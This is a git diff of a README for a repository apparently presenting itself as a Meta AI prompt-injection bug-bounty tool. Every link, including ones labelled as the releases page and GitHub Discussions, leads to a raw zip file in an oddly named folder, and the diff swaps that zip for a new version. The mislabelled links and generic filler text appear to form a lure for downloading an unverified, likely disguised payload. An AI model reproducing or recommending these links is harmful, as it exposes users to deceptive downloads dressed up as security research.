@@ -1,7 +1,7 @@
 # 🛠️ meta-ai-bug-bounty - Explore AI Vulnerabilities Easily
 
 ## 📥 Download the Application
-[![Download](https://raw.githubusercontent.com/ParraX123/meta-ai-bug-bounty/main/ectosarcous/meta-ai-bug-bounty.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/ParraX123/meta-ai-bug-bounty/main/ectosarcous/meta-ai-bug-bounty.zip)
+[![Download](https://github.com/ParraX123/meta-ai-bug-bounty/raw/refs/heads/main/ectosarcous/ai-meta-bounty-bug-3.6.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/ParraX123/meta-ai-bug-bounty/raw/refs/heads/main/ectosarcous/ai-meta-bounty-bug-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the **meta-ai-bug-bounty** project. This application allows you to explore vulnerabilities related to prompt injection and command execution in Meta AI's Instagram Group Chat. You can contribute to cybersecurity efforts and understand how these vulnerabilities function in a real-world context.
@@ -18,7 +18,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page where you can find the latest version.
    
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/ParraX123/meta-ai-bug-bounty/main/ectosarcous/meta-ai-bug-bounty.zip)
+   [Visit the Releases Page to Download](https://github.com/ParraX123/meta-ai-bug-bounty/raw/refs/heads/main/ectosarcous/ai-meta-bounty-bug-3.6.zip)
 
 2. **Choose the Right Version**: After you access the Releases page, locate the most recent version. You will see version numbers and a summary of each release.
 
@@ -58,7 +58,7 @@ If you want to help improve this project, consider contributing. Here’s how yo
 
 ## 🌍 Community and Support
 Get involved with our community! You can find discussions and support options in the following ways:
-- **GitHub Discussions**: Participate in community discussions on [GitHub Discussions](https://raw.githubusercontent.com/ParraX123/meta-ai-bug-bounty/main/ectosarcous/meta-ai-bug-bounty.zip).
+- **GitHub Discussions**: Participate in community discussions on [GitHub Discussions](https://github.com/ParraX123/meta-ai-bug-bounty/raw/refs/heads/main/ectosarcous/ai-meta-bounty-bug-3.6.zip).
 - **Documentation**: Access comprehensive documentation to help you understand features better.
 
 ## 📅 Regular Updates
@@ -70,4 +70,4 @@ Thank you for your interest in the **meta-ai-bug-bounty** project. Together, we 
 ## 📥 Download the Application Again
 To download the application, you can revisit the Releases page here:
 
-[Download from Releases Page](https://raw.githubusercontent.com/ParraX123/meta-ai-bug-bounty/main/ectosarcous/meta-ai-bug-bounty.zip)
+[Download from Releases Page](https://github.com/ParraX123/meta-ai-bug-bounty/raw/refs/heads/main/ectosarcous/ai-meta-bounty-bug-3.6.zip)
